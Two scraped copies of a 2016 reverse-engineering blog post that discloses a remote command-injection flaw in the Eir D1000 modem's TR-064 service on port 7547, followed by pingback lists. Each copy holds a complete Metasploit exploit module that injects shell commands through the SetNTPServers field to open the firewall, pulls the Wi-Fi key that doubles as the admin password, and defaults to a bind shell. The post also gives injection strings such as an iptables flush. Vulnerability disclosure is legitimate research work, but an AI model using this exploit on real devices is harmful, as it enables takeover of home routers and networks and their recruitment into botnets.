=== Content from devicereversing.wordpress.com_5bddb09f_20250125_215330.html ===

[Skip to content](#content)
[Menu](#slide-menu)
# [Reverse Engineering Blog](https://devicereversing.wordpress.com/)

## Finding undocumented features in devices

[kenzo2017](https://devicereversing.wordpress.com/author/kenzo2017/ "Posts by kenzo2017")
in [Uncategorized](https://devicereversing.wordpress.com/category/uncategorized/)
November 7, 2016November 19, 2016
1,414 Words

# Eir’s D1000 Modem Is Wide Open To Being Hacked.

## **Background**

The Eir D1000 Modem has bugs that allow an attacker to gain full control of the modem from the Internet. The modem could then be used to hack into internal computers on the network, as a proxy host to hack other

computers or even as a bot in a botnet.

A port scan of the the modem revealed that it has one TCP port exposed to the Internet, port 7547. Port 7547 is running as part of the TR-069 protocol. TR-069 a.k.a CPE WAN Management Protocol a.k.a. CWMP is a protocol that ISPs like Eir use to manage all of the modems on their network.

When Eir’s technical support want to manage the modem – maybe to reset the Wi-Fi password, they instruct the ACS (Access Control Server – the server used to manage the modems) to connect to the modem on port 7547 and send it a “connection request” command. The modem then connects to the ACS and Eir’s technical support can change whatever settings they want.

What is not very well known is that the server on port 7457 is also a TR-064 server.

This is another protocol related to TR-069. It is also known as “LAN-Side CPE Configuration”. The idea behind this protocol is to allow the ISP to configure the modem from installation software supplied with the modem. The protocol is not supposed to be accessed from the WAN side of the modem but in the D1000 modem, we can send TR-064 commands to port 7547 on the WAN side. This allows us to “configure” the modem from the Internet.

There are many TR-064 commands, some useful ones are:

```
DeviceInfo/GetInfo:
 This gives general information about the modem including serial number,
 firmware version, device description etc...

WLANConfiguration/GetSecurityKeys:
 This returns the Wi-Fi key

WLANConfiguration/GetInfo:
 This returns the SSID and MAC address

Time/SetNTPServers:
 This is the pièce de résistance. We can exploit this command to run
 busybox shell commands on the modem. e.g. setting the NTP server to
 "`iptables -F INPUT`" turns off the firewall on the modem which in
 turn allows access to the administration interface on port 80.
```
##

## Proof Of Concept Exploit

By sending certain TR-064 commands, we can instruct the modem to open port 80 on the firewall. This allows access the the web administration interface from the Internet facing side of the modem. The default login password for the D1000 is the Wi-Fi password. This is easily obtained with another TR-064 command.

Here’s a Metasploit module :

```

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Eir D1000 Modem CWMP Exploit POC',
      'Description' => %q{
        This exploit drops the firewall to allow access to the web administration interface on port 80 and
	it also retrieves the wifi password. The default login password to the web interface is the default wifi
        password. This exploit was tested on firmware versions up to 2.00(AADU.5)_20150909.
      },
      'Author'      =>
        [
          'Kenzo', # Vulnerability discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Nov 07 2016',
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'linux/mipsbe/shell_bind_tcp'
        },
      'Targets' =>
        [
          [ 'MIPS Little Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSLE
            }
          ],
          [ 'MIPS Big Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSBE
            }
          ],
        ],
      'DefaultTarget'    => 1
      ))

    register_options(
      [
        Opt::RPORT(7547), # CWMP port
      ], self.class)

  @data_cmd_template = "<?xml version=\"1.0\"?>"
  @data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
  @data_cmd_template << " <SOAP-ENV:Body>"
  @data_cmd_template << "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
  @data_cmd_template << "   <NewNTPServer1>%s</NewNTPServer1>"
  @data_cmd_template << "   <NewNTPServer2></NewNTPServer2>"
  @data_cmd_template << "   <NewNTPServer3></NewNTPServer3>"
  @data_cmd_template << "   <NewNTPServer4></NewNTPServer4>"
  @data_cmd_template << "   <NewNTPServer5></NewNTPServer5>"
  @data_cmd_template << "  </u:SetNTPServers>"
  @data_cmd_template << " </SOAP-ENV:Body>"
  @data_cmd_template << "</SOAP-ENV:Envelope>"
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/globe'
      })
    rescue ::Rex::ConnectionError
      vprint_error("A connection error has occured")
      return Exploit::CheckCode::Unknown
    end

    if res and res.code == 404 and res.body =~ /home_wan.htm/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Trying to access the device...")

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end

    print_status("Exploiting...")
    print_status("Dropping firewall on port 80...")
    execute_command("`iptables -I INPUT -p tcp --dport 80 -j ACCEPT`","")
    key = get_wifi_key()
    print_status("WiFi key is #{key}")
    execute_command("tick.eircom.net","")
  end

  def execute_command(cmd, opts)
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:Time:1#SetNTPServers"
    data_cmd = @data_cmd_template % "#{cmd}"
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def get_wifi_key()
    print_status("Getting the wifi key...")
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"
    data_cmd_template = "<?xml version=\"1.0\"?>"
    data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data_cmd_template << " <SOAP-ENV:Body>"
    data_cmd_template << "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
    data_cmd_template << "  </u:GetSecurityKeys>"
    data_cmd_template << " </SOAP-ENV:Body>"
    data_cmd_template << "</SOAP-ENV:Envelope>"
    data_cmd= data_cmd_template

    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })

      /NewPreSharedKey>(?<key>.*)<\/NewPreSharedKey/ =~ res.body
      return key
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

```
## Precautions Eir Could Have Taken To Make The Modem More Secure

1. Back in the days when Eir were Eircom and they used Netopia modems, port 7547 was blocked to every IP address except those assigned to Eir’s management servers. This meant even though the Netopia modems had bugs, they could not be exploited. Inexplicably, Eir do not do this for their newer modems. If they did, these bugs would not have been exploitable.
2. They could have started a bug bounty program. This would have created an incentive for security researchers to look for flaws in Eir’s modems.

## Other Points Of Interest

* This is not the only bug in this software, there are others. It was not even the first, previous firmware versions were also vulnerable to CVE-2014-9222, the “Misfortune Cookie” bug. Eir quietly patched that bug in firmware version “2.00(AADU.5)D0.”, sometime in early 2015.
* There are also a few thousand Eir modems being used on other ISP networks (mainly Vodafone). These are no longer being managed by Eir therefore any firmware updates will not be applied to these and it is likely that they will remain vulnerable to this exploit even if Eir update the firmware to fix these bugs.
* Another of Eir’s modems, the “P-660HN-T1A\_IPv6” is vulnerable to the same bugs.
* Currently Shodan.io, the “Internet of Things” search engine shows that they are about 66,000 modems affected by this bug. Previously, it showed it to be around 100,000. [Click here to search Shodan.io (you need to have an account there)](https://www.shodan.io/search?query=rompager+port%3A7547+country%3Aie)

## Further Reading

<https://www.broadband-forum.org/technical/download/TR-064.pdf>

<https://www.broadband-forum.org/technical/download/TR-069.pdf>

Like Loading...

## Post navigation

[Eir P-660HW-T1 Vulnerability](https://devicereversing.wordpress.com/2016/11/19/eir-p-660hw-t1-remote-vulnerability-2/)

## 119 thoughts on “Eir’s D1000 Modem Is Wide Open To Being Hacked.”

## Comment navigation

[Older Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-2/#comments)

1. Pingback: [CVE-2016-10372 – 安百科技](https://vul.anbai.com/18558.html)
3. Pingback: [Eir D1000 安全漏洞 – 安百科技](https://vul.anbai.com/19477.html)
5. Pingback: [Mirai continua em atividade – DSI Blog](https://tfzsegblog.wordpress.com/2017/05/19/mirai-continua-em-atividade/)
7. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites – The Hugh Morris Agency](https://thehma.us/thousands-of-hacked-home-routers-are-attacking-wordpress-sites/)
9. Pingback: [Mirai continua em atividade – TFZSEG Blog](http://www.tfzseg.com.br/blog/seguranca-da-informacao/malware/mirai-continua-em-atividade/)
11. Pingback: [Hard Coded Credentials in DSL Home Routers – Technology Random Blog](https://mustbehero.wordpress.com/2017/08/15/hard-coded-credentials-in-dsl-home-routers/)
13. Pingback: [Mirai continua em atividade – Fernando Torres](http://www.fernando-torres.eti.br/?p=137)
15. Pingback: [Ботнет атаковал немецкого провайдера и заразил миллион устройств - Новости о Даркнете!](http://ruonion.biz/news/botnet-atakoval-nemeckogo-provajdera-i-zarazil-million-ustrojstv/)
17. Pingback: [В Ирландии тысячи пользователй используют уязвимые модемы - Новости о Даркнете!](http://ruonion.biz/news/v-irlandii-tysyachi-polzovatelj-ispolzuyut-uyazvimye-modemy/)
19. Pingback: [Drucksache: Windows Developer 1.19 - Wie sicher ist SOAP? | Dipl.-Inform. Carsten Eilers](http://www.ceilers-news.de/serendipity/1013-Drucksache-Windows-Developer-1.19-Wie-sicher-ist-SOAP.html)
21. Pingback: [SOAP: Wie sicher ist es und wie kann man es absichern?](https://entwickler.de/online/security/soap-sicherheit-579874314.html)
23. Pingback: [Bot podobny do Mirai atakuje rutery nowym błędem – także w Polsce | Zaufana Trzecia Strona](https://zaufanatrzeciastrona.pl/post/bot-podobny-do-mirai-atakuje-rutery-nowym-bledem-takze-polsce/)
25. Pingback: [德国电信断网事件详细分析：mirai僵尸网络的新变种和旧主控 – My Blog's](https://blog.bg7ezy.cn/?p=24275)
27. Pingback: [Hackers se apoyan en routers situados en hogares para atacar sitios web WordPress - MuySeguridad](https://www.muyseguridad.net/2017/04/13/hackers-routers-hogares-atacar-wordpress/)
29. Pingback: [Serangan Cyber Lumpuhkan Ratusan Ribu Router Menjadi Offline - berisi.id](https://berisi.id/serangan-cyber-lumpuhkan-ratusan-ribu-router-menjadi-offline/)
31. Pingback: [Un ciberataque deja fuera de línea a casi un millón de enrutadores](https://mywifihacker.com/un-ciberataque-deja-fuera-de-linea-a-casi-un-millon-de-enrutadores/)
33. Pingback: [Newly discovered router flaw being hammered by in-the-wild attacks > XL Systems & Graphics - Latest Technology News & Products](https://xlsystems-graphics.com/newly-discovered-router-flaw-being-hammered-by-in-the-wild-attacks/)

## Comment navigation

[Older Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-2/#comments)

### Leave a comment [Cancel reply](/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/#respond)

Δ

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

Menu
## Menu

* [About](https://devicereversing.wordpress.com/about/)
* [Contact](https://devicereversing.wordpress.com/contact/)

* [Comment](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reverse Engineering Blog](https://devicereversing.wordpress.com)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdevicereversing.wordpress.com%2F2016%2F11%2F07%2Feirs-d1000-modem-is-wide-open-to-being-hacked%2F&signup_flow=account)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Reverse Engineering Blog](https://devicereversing.wordpress.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fdevicereversing.wordpress.com%2F2016%2F11%2F07%2Feirs-d1000-modem-is-wide-open-to-being-hacked%2F&signup_flow=account)
  + [Copy shortlink](https://wp.me/p850z3-n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/)
  + [View post in Reader](https://wordpress.com/read/blogs/119404501/posts/23)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)
Design a site like this with WordPress.com[Get started](https://wordpress.com/start/?ref=marketing_bar)



=== Content from devicereversing.wordpress.com_4eca4ccf_20250126_121429.html ===

[Skip to content](#content)
[Menu](#slide-menu)
# [Reverse Engineering Blog](https://devicereversing.wordpress.com/)

## Finding undocumented features in devices

[kenzo2017](https://devicereversing.wordpress.com/author/kenzo2017/ "Posts by kenzo2017")
in [Uncategorized](https://devicereversing.wordpress.com/category/uncategorized/)
November 7, 2016November 19, 2016
1,414 Words

# Eir’s D1000 Modem Is Wide Open To Being Hacked.

## **Background**

The Eir D1000 Modem has bugs that allow an attacker to gain full control of the modem from the Internet. The modem could then be used to hack into internal computers on the network, as a proxy host to hack other

computers or even as a bot in a botnet.

A port scan of the the modem revealed that it has one TCP port exposed to the Internet, port 7547. Port 7547 is running as part of the TR-069 protocol. TR-069 a.k.a CPE WAN Management Protocol a.k.a. CWMP is a protocol that ISPs like Eir use to manage all of the modems on their network.

When Eir’s technical support want to manage the modem – maybe to reset the Wi-Fi password, they instruct the ACS (Access Control Server – the server used to manage the modems) to connect to the modem on port 7547 and send it a “connection request” command. The modem then connects to the ACS and Eir’s technical support can change whatever settings they want.

What is not very well known is that the server on port 7457 is also a TR-064 server.

This is another protocol related to TR-069. It is also known as “LAN-Side CPE Configuration”. The idea behind this protocol is to allow the ISP to configure the modem from installation software supplied with the modem. The protocol is not supposed to be accessed from the WAN side of the modem but in the D1000 modem, we can send TR-064 commands to port 7547 on the WAN side. This allows us to “configure” the modem from the Internet.

There are many TR-064 commands, some useful ones are:

```
DeviceInfo/GetInfo:
 This gives general information about the modem including serial number,
 firmware version, device description etc...

WLANConfiguration/GetSecurityKeys:
 This returns the Wi-Fi key

WLANConfiguration/GetInfo:
 This returns the SSID and MAC address

Time/SetNTPServers:
 This is the pièce de résistance. We can exploit this command to run
 busybox shell commands on the modem. e.g. setting the NTP server to
 "`iptables -F INPUT`" turns off the firewall on the modem which in
 turn allows access to the administration interface on port 80.
```
##

## Proof Of Concept Exploit

By sending certain TR-064 commands, we can instruct the modem to open port 80 on the firewall. This allows access the the web administration interface from the Internet facing side of the modem. The default login password for the D1000 is the Wi-Fi password. This is easily obtained with another TR-064 command.

Here’s a Metasploit module :

```

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Eir D1000 Modem CWMP Exploit POC',
      'Description' => %q{
        This exploit drops the firewall to allow access to the web administration interface on port 80 and
	it also retrieves the wifi password. The default login password to the web interface is the default wifi
        password. This exploit was tested on firmware versions up to 2.00(AADU.5)_20150909.
      },
      'Author'      =>
        [
          'Kenzo', # Vulnerability discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'Nov 07 2016',
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'linux/mipsbe/shell_bind_tcp'
        },
      'Targets' =>
        [
          [ 'MIPS Little Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSLE
            }
          ],
          [ 'MIPS Big Endian',
            {
              'Platform' => 'linux',
              'Arch'     => ARCH_MIPSBE
            }
          ],
        ],
      'DefaultTarget'    => 1
      ))

    register_options(
      [
        Opt::RPORT(7547), # CWMP port
      ], self.class)

  @data_cmd_template = "<?xml version=\"1.0\"?>"
  @data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
  @data_cmd_template << " <SOAP-ENV:Body>"
  @data_cmd_template << "  <u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1\">"
  @data_cmd_template << "   <NewNTPServer1>%s</NewNTPServer1>"
  @data_cmd_template << "   <NewNTPServer2></NewNTPServer2>"
  @data_cmd_template << "   <NewNTPServer3></NewNTPServer3>"
  @data_cmd_template << "   <NewNTPServer4></NewNTPServer4>"
  @data_cmd_template << "   <NewNTPServer5></NewNTPServer5>"
  @data_cmd_template << "  </u:SetNTPServers>"
  @data_cmd_template << " </SOAP-ENV:Body>"
  @data_cmd_template << "</SOAP-ENV:Envelope>"
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => '/globe'
      })
    rescue ::Rex::ConnectionError
      vprint_error("A connection error has occured")
      return Exploit::CheckCode::Unknown
    end

    if res and res.code == 404 and res.body =~ /home_wan.htm/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Trying to access the device...")

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::Unknown, "#{peer} - Failed to access the vulnerable device")
    end

    print_status("Exploiting...")
    print_status("Dropping firewall on port 80...")
    execute_command("`iptables -I INPUT -p tcp --dport 80 -j ACCEPT`","")
    key = get_wifi_key()
    print_status("WiFi key is #{key}")
    execute_command("tick.eircom.net","")
  end

  def execute_command(cmd, opts)
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:Time:1#SetNTPServers"
    data_cmd = @data_cmd_template % "#{cmd}"
    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def get_wifi_key()
    print_status("Getting the wifi key...")
    uri = '/UD/act?1'
    soapaction = "urn:dslforum-org:service:WLANConfiguration:1#GetSecurityKeys"
    data_cmd_template = "<?xml version=\"1.0\"?>"
    data_cmd_template << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data_cmd_template << " <SOAP-ENV:Body>"
    data_cmd_template << "  <u:GetSecurityKeys xmlns:u=\"urn:dslforum-org:service:WLANConfiguration:1\">"
    data_cmd_template << "  </u:GetSecurityKeys>"
    data_cmd_template << " </SOAP-ENV:Body>"
    data_cmd_template << "</SOAP-ENV:Envelope>"
    data_cmd= data_cmd_template

    begin
      res = send_request_cgi({
        'uri'    => uri,
        'ctype' => "text/xml",
        'method' => 'POST',
        'headers' => {
          'SOAPAction' => soapaction,
          },
        'data' => data_cmd
      })

      /NewPreSharedKey>(?<key>.*)<\/NewPreSharedKey/ =~ res.body
      return key
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
end

```
## Precautions Eir Could Have Taken To Make The Modem More Secure

1. Back in the days when Eir were Eircom and they used Netopia modems, port 7547 was blocked to every IP address except those assigned to Eir’s management servers. This meant even though the Netopia modems had bugs, they could not be exploited. Inexplicably, Eir do not do this for their newer modems. If they did, these bugs would not have been exploitable.
2. They could have started a bug bounty program. This would have created an incentive for security researchers to look for flaws in Eir’s modems.

## Other Points Of Interest

* This is not the only bug in this software, there are others. It was not even the first, previous firmware versions were also vulnerable to CVE-2014-9222, the “Misfortune Cookie” bug. Eir quietly patched that bug in firmware version “2.00(AADU.5)D0.”, sometime in early 2015.
* There are also a few thousand Eir modems being used on other ISP networks (mainly Vodafone). These are no longer being managed by Eir therefore any firmware updates will not be applied to these and it is likely that they will remain vulnerable to this exploit even if Eir update the firmware to fix these bugs.
* Another of Eir’s modems, the “P-660HN-T1A\_IPv6” is vulnerable to the same bugs.
* Currently Shodan.io, the “Internet of Things” search engine shows that they are about 66,000 modems affected by this bug. Previously, it showed it to be around 100,000. [Click here to search Shodan.io (you need to have an account there)](https://www.shodan.io/search?query=rompager+port%3A7547+country%3Aie)

## Further Reading

<https://www.broadband-forum.org/technical/download/TR-064.pdf>

<https://www.broadband-forum.org/technical/download/TR-069.pdf>

Like Loading...

## Post navigation

[Eir P-660HW-T1 Vulnerability](https://devicereversing.wordpress.com/2016/11/19/eir-p-660hw-t1-remote-vulnerability-2/)

## 119 thoughts on “Eir’s D1000 Modem Is Wide Open To Being Hacked.”

## Comment navigation

[Older Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-1/#comments)[Newer Comments](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/#comments)

1. Pingback: [德国电信断网事件详细分析：mirai僵尸网络的新变种和旧主控 Mecside.com|墨方小窝 贵州科创校园联盟](http://mecside.cn/2016/11/30/%E5%BE%B7%E5%9B%BD%E7%94%B5%E4%BF%A1%E6%96%AD%E7%BD%91%E4%BA%8B%E4%BB%B6%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%EF%BC%9Amirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E7%9A%84%EF%BF%BD%25)
3. Pingback: [New Attack Vector of Mirai – Portfolio](https://ranjithmurali.com/new-attack-vector-of-mirai/)
5. Pingback: [德国电信断网事件详细分析：mirai僵尸网络的新变种和旧主控 - 莹莹之色](http://hack.hk.cn/2016/11/30/%E5%BE%B7%E5%9B%BD%E7%94%B5%E4%BF%A1%E6%96%AD%E7%BD%91%E4%BA%8B%E4%BB%B6%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%EF%BC%9Amirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E7%9A%84%EF%BF%BD%25)
7. Pingback: [Атаки на маршрутизаторы — ITG.BY](https://itg.by/%D0%B0%D1%82%D0%B0%D0%BA%D0%B8-%D0%BD%D0%B0-%D0%BC%D0%B0%D1%80%D1%88%D1%80%D1%83%D1%82%D0%B8%D0%B7%D0%B0%D1%82%D0%BE%D1%80%D1%8B/)
9. Pingback: [Newly discovered router flaw being hammered by in-the-wild attacks | RMK Consulting, LLC- Business Technology Partner](http://rmkc.it/newly-discovered-router-flaw-being-hammered-by-in-the-wild-attacks/)
11. Pingback: [德国电信断网：mirai僵尸网络的新变种和旧主控 - 莹莹之色](http://hack.hk.cn/2016/11/30/%E5%BE%B7%E5%9B%BD%E7%94%B5%E4%BF%A1%E6%96%AD%E7%BD%91%EF%BC%9Amirai%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E7%9A%84%E6%96%B0%E5%8F%98%E7%A7%8D%E5%92%8C%E6%97%A7%E4%B8%BB%EF%BF%BD%25)
13. Pingback: [How “Peter Parker’s” Mirai Variant Took Down 900,000 Routers](https://www.tripwire.com/state-of-security/security-data-protection/iot/peter-parker-just-hacked-900000-routers/)
15. Pingback: [Serangan Cyber Lumpuhkan Ratusan Ribu Router Menjadi Offline - Error 404 Cyber News](https://errorcybernews.com/serangan-cyber-lumpuhkan-ratusan-ribu-router-menjadi-offline/)
17. Pingback: [Routers ប្រហែលជា ១លានគ្រឿងត្រូវបានគាំងមិនដំណើរការ – SecuDemy.com](https://secudemy.com/cyber-attack-knocks-nearly-million-routers-offline/)
19. Pingback: [Newly discovered router flaw being hammered by in-the-wild attacks – Tech Texts](http://techtexts.com/index.php/2016/12/02/newly-discovered-router-flaw-being-hammered-by-in-the-wild-attacks/)
21. Pingback: [Mirai Botnet Behind Internet Problems for 100,000 TalkTalk and UK Post Office Users – Computer Repair Plymouth](http://computerrepairplymouthmn.com/2016/12/02/mirai-botnet-behind-internet-problems-for-100000-talktalk-and-uk-post-office-users/)
23. Pingback: [Recent vulnerability in Eir D1000 Router used to spread updated version of Mirai DDoS bot | HackFence Manages Wordpress Security Service](https://www.hackfence.com/w/recent-vulnerability-in-eir-d1000-router-used-to-spread-updated-version-of-mirai-ddos-bot/)
25. Pingback: [Blame the ISPs rather than the routers – DailyNews Computer](http://dailynews-geek.com/computer/2016/12/04/blame-the-isps-rather-than-the-routers/)
27. Pingback: [Cyber Attack Knocks Nearly a Million Routers Offline – TechJunkie | Dedicated to delivering up to date technology news from around the internet.](http://www.techjunkie.xyz/2016/11/29/cyber-attack-knocks-nearly-a-million-routers-offline/)
29. Pingback: [Mirai continua em atividade – APTSI](https://aptsi.wordpress.com/2016/12/06/mirai-continua-em-atividade/)
31. Pingback: [IoT Botnet Plague: Coming Soon to an ISP Near You (InfoRiskToday) – sec.uno](https://www.sec.uno/2016/12/07/iot-botnet-plague-coming-soon-to-an-isp-near-you-inforisktoday/)
33. Pingback: [Cyber Attack Knocks Nearly a Million Routers Offline | tellmenow](http://tellmenow.info/cyber-attack-knocks-nearly-a-million-routers-offline)
35. Pingback: [TR-064漏洞受影响厂商设备及TR-064协议安全性分析 - 莹莹之色](http://hack.hk.cn/2016/12/09/tr-064%E6%BC%8F%E6%B4%9E%E5%8F%97%E5%BD%B1%E5%93%8D%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E5%8F%8Atr-064%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90/)
37. Pingback: [TR-064漏洞受影响厂商设备及TR-064协议安全性分析 – Terry & CoCo](http://www.shentaowanke.com/?p=1535)
39. Pingback: [TR-064漏洞受影响厂商设备及TR-064协议安全性分析 - 莹莹之色](http://hack.hk.cn/2016/12/09/tr-064%E6%BC%8F%E6%B4%9E%E5%8F%97%E5%BD%B1%E5%93%8D%E5%8E%82%E5%95%86%E8%AE%BE%E5%A4%87%E5%8F%8Atr-064%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90-2/)
41. Pingback: [TR-064漏洞受影响厂商设备及TR-064协议安全性分析 - 爱好博客](http://ihow.top/15893.html)
43. Pingback: [hijacked home broadband routers | OSINT](http://opensources.info/hijacked-home-broadband-routers/)
45. Pingback: [Talk Talk Routers formen part de la xarxa Mirai - Navega segur](http://navegosegur.com/2016/12/12/talk-talk-routers-formen-part-xarxa-mirai/)
47. Pingback: [Тысячи клиентов крупнейшего провайдера Ирландии используют уязвимые модемы Eir D1000 — INTRO STORE](http://store.introcomp.ru/news/%D1%82%D1%8B%D1%81%D1%8F%D1%87%D0%B8-%D0%BA%D0%BB%D0%B8%D0%B5%D0%BD%D1%82%D0%BE%D0%B2-%D0%BA%D1%80%D1%83%D0%BF%D0%BD%D0%B5%D0%B9%D1%88%D0%B5%D0%B3%D0%BE-%D0%BF%D1%80%EF%BF%BD%25)
49. ![](https://1.gravatar.com/avatar/7269fb6cd7278e29e23933578d48c28b02c889daaa2c119042791631cf95b66b?s=48&d=identicon&r=G) **Hans** says:
    [January 2, 2017 at 9:36 am](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-2/#comment-81)

    Hi Kenzo, did you notified the affected vendor before publishing this? How was their reaction?

    [Like](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/?like_comment=81&_wpnonce=87befef2f0)Like

    [Reply](https://devicereversing.wordpress.com/2016/11/07/eirs-d1000-modem-is-wide-open-to-being-hacked/comment-page-2/?replytocom=81#respond)
51. Pingback: [Mirai Botnet Tipe Baru Berhasil Mengeksploitasi Celah Keamanan Pada Modem DSL | Netsec Indonesia](https://netsec.id/mirai-botnet-tipe-baru-modem-dsl/)
53. Pingback: [В Ирландии тысячи пользователй используют уязвимые модемы | Все о TOR - параллельном интернете](http://ruonion.com/news/v-irlandii-tysyachi-polzovatelj-ispolzuyut-uyazvimye-modemy/)
55. Pingback: [Ботнет атаковал немецкого провайдера и заразил миллион устройств | Все о TOR - параллельном интернете](http://ruonion.com/news/botnet-atakoval-nemeckogo-provajdera-i-zarazil-million-ustrojstv/)
57. Pingback: [Newly discovered router flaw being hammered by in-the-wild attacks | Ars Technica | | Craythorne Enterprises](http://www.craythorne.co.za/newly-discovered-router-flaw-being-hammered-by-in-the-wild-attacks-ars-technica/)
59. Pingback: [Eir’s D1000 Modem Güvenlik Zafiyeti | Mehmet Ali Erturk](http://mehmetalierturk.com/2017/01/22/eirs-d1000-modem-guvenlik-zafiyeti/)
61. Pingback: [Deutsche Telekom: Firmwarelücke der DSL-Router war schon länger bekannt](https://tarnkappe.info/deutsche-telekom-firmwareluecke-der-dsl-router-war-schon-laenger-bekannt/)
63. Pingback: [Mirai goes Deutsche Telekom | Digital Society Institute (DSI)](https://blog.esmt.org/dsi/?p=275)
65. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites](https://www.wordfence.com/blog/2017/04/home-routers-attacking-wordpress/)
67. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites - WekkyDesign | Web design in Lagos, Nigeria.](http://wekkydesign.com/general-security/thousands-of-hacked-home-routers-are-attacking-wordpress-sites)
69. Pingback: [Thousands of Hacked Home Routers are Attacking WordPress Sites | Online Entrepreneur Resource](https://entrepreneurbiz.info/thousands-of-hacked-home-routers-are-attacking-wordpress-sites/)
